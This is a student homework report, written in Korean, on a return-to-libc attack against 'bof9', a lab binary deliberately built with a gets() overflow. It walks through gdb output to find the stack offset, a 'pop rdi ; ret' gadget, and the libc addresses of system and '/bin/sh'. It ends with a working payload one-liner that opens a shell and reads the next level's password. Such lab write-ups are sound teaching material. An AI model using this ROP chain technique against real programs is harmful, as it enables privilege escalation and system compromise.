# Report. HW8.

## RTL

"Return To Libc"의 약자이다. `RET` 영역을 원하는 **공유 라이브러리 함수의 주소**로 변경하여 이것을 호출하는 방식이다.


## `bof9`

<details><summary>bof9.c</summary>
  <p>

```c
// AFTER => bof8.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION OFF

char * binsh = "/bin/sh";

void vuln(void) {
    char buf[BUF_SIZE];

    if (setreuid(UID_BOF10, UID_BOF10)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(UID_BOF10, UID_BOF10)) {
        perror("setgid");
        exit(1);
    }
    printf("system:%p\n", system);
    printf("binsh:%p\n", binsh);
    gets(buf);
    printf("Hello %s!\n", buf);
}

int main(void) {
    vuln();
    return 0;
}

```
</p></details>

`gets` 함수를 통해 입력을 받는다. 이전 수업내용이라면 여기에 쉘코드를 넣어서 권한을 얻을 수 있었겠지만, 이번엔 

## 1. `buf`와 `RET` 간의 거리 확인

`b vuln`으로 `vuln` 함수 시작지점에 breakpoint를 걸고 실행을 해 보았다. 디버깅 실행 시 `RET`, 그러니까 `$rsp`의 주소를 확인해 보니

    $rsp : 0x00007fffffffe4a8 > 0x00005555555552b7 > <main+13> mov eax, 0x0
  
으로... 그러니까 `0x00007fffffffe4a8`이 나온다.

쭉 진행해서 `buf`에 입력을 받는 부분까지 가서 `buf`의 주소값을 확인해 보았더니

    gets@plt (
        $rdi = 0x00007fffffffe498 > 0x0000555555555100 > <_start+0> endbr64 ,
        $rsi = 0x0000000000000001
    )

...에서 `$rdi` 값인 `0x00007fffffffe498`이 나왔다. `main`의 `$rsp`와 16 차이가 나는 것이다. 즉... **`gets` 입력에서 16개의 더미 문자를 주고 그 뒤에 `/bin/sh` 실행 코드를 넣어주면** 되는 거겠지?



## 2. `/bin/sh`, `system`, 그리고 `pop rdi ; ret`

### `pop rdi ; ret`

디버깅 모드로 `bof9`를 실행하고 `vmmap` 명령어를 사용해 보았다. `bof9`와 매핑된 메모리 정보를 보여준다.

    gef➤  vmmap
    [ Legend:  Code | Heap | Stack ]
    Start              End                Offset             Perm Path
    0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/bof9/bof9
    0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/bof9/bof9
    0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/bof9/bof9
    0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/bof9/bof9
    0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/bof9/bof9
    0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
    0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /tmp/2.23/lib/libc.so.6
    0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /tmp/2.23/lib/libc.so.6
    0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /tmp/2.23/lib/libc.so.6
    0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /tmp/2.23/lib/libc.so.6
    0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
    0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /tmp/2.23/lib/ld-linux-x86-64.so.2
    0x00007ffff7ff3000 0x00007ffff7ff6000 0x0000000000000000 rw-
    0x00007ffff7ff6000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
    0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
    0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /tmp/2.23/lib/ld-linux-x86-64.so.2
    0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /tmp/2.23/lib/ld-linux-x86-64.so.2
    0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
    0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
    0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

...으로 나오는데, *실행 가능한* libc 코드의 주소값이 `0x00007ffff7a0d000`으로 나온다.

그리고... `ROPgadget.py`를 통해 `pop rdi ; ret`가 `/tmp/2.23/lib/libc.so.6`에서 위치해 있는 곳을 찾아보자.

    gef➤  !ROPgadget.py --binary /tmp/2.23/lib/libc.so.6 | grep "pop rdi ; ret"
    0x0000000000067495 : add byte ptr [rax], al ; add cl, ch ; pop rdi ; ret 0xffff
    0x0000000000067497 : add cl, ch ; pop rdi ; ret 0xffff
    0x000000000019dba2 : or byte ptr [rdx + 0xb], cl ; pop rdi ; ret
    0x0000000000021102 : pop rdi ; ret
    0x0000000000067499 : pop rdi ; ret 0xffff
    0x0000000000001c26 : pop rdi ; retf 0x49f2
    0x0000000000132e45 : pop rdi ; retf 0xffee
    
순전히 `"pop rdi ; ret"`만 있는 곳은 `0x0000000000021102`이다. 그러니까... `/tmp/2.23/lib/libc.so.6`에서 `pop rdi ; ret` 명령어를 쓰려면 이 둘의 주소값을 더해줘야 하는 것이다. 그러니까... 주소 `0x00007ffff7a2e102`를 참조해야 저 명령어를 사용할 수가 있다.


### `"/bin/sh"`

`bof9` 디버깅 중인 `gef` 내에서 "/bin/sh"에 대한 내용을 찾아보았다.

    gef➤  search-pattern "/bin/sh"
    [+] Searching '/bin/sh' in memory
    [+] In '/home/bof9/bof9'(0x555555556000-0x555555557000), permission=r--
      0x555555556004 - 0x55555555600b  →   "/bin/sh"
    [+] In '/home/bof9/bof9'(0x555555557000-0x555555558000), permission=r--
      0x555555557004 - 0x55555555700b  →   "/bin/sh"
    [+] In '/tmp/2.23/lib/libc.so.6'(0x7ffff7a0d000-0x7ffff7bcd000), permission=r-x
      0x7ffff7b99d57 - 0x7ffff7b99d5e  →   "/bin/sh"

이 중 위 2개 - 프로그램을 실행하면 문자열 `"/bin/sh"`가 있는 주소값은 저 2개 중 위의 것으로 나온다 - 는 *`bof9`에서 `"/bin/sh"`이 위치해 있는* 곳에 대한 내용이다. 우리가 사용할 건 `libc` 안에 있는 `"/bin/sh"`이다. 그러니까... 맨 밑에 있는 `0x00007ffff7b99d57`을 써야 한다.


### `system`

`bof9` 디버깅 중인 `gef`에서 system을 `print` 해 보라 해 보자.

    gef➤  p system
    $3 = {<text variable, no debug info>} 0x7ffff7a52390 <system>
    
프로그램을 그냥 실행해도 `system`의 주소값으로 `0x00007ffff7a52390`이 나온다(`bof9`에서 `system`의 주소값을 출력해주기도 한다).


## 3. 섞기

위에서 알아낸 것들을 요약하면 다음과 같다:

- `system`이 위치해 있는 주소값 : `0x00007ffff7a52390`
- `libc` 안에 있는 `"/bin/sh"`의 주소값 : `0x00007ffff7b99d57`
- `libc` 영역에서 `pop rdi ; ret` 명령어를 참조하기 위한 주소값 : `/tmp/2.23/lib/libc.so.6` 주소값 `0x00007fff7a0d000` + `pop rdi ; ret` 가젯의 주소값 `0x0000000000021102` = `0x00007ffff7a2e102`

이들을 `RET`에 넣어주어야 한다. 우리 입장에서 넣어주는 순서는... **'`pop rdi ; ret` 기젯 주소값 - `"/bin/sh"` 주소값 - `system` 주소값** 순이다. 이걸 payload로 작성하면 다음과 같다:

    (python -c "print('a' * 16 + '\x02\xe1\xa2\xf7\xff\x7f\x00\x00' + '\x57\x9d\xb9\xf7\xff\x7f\x00\x00' + '\x90\x23\xa5\xf7\xff\x7f\x00\x00')"; cat) | ./bof9
    
이걸 넣어주어 `bof10`의 비멀번호를 알 수 있었다.


# -- END --

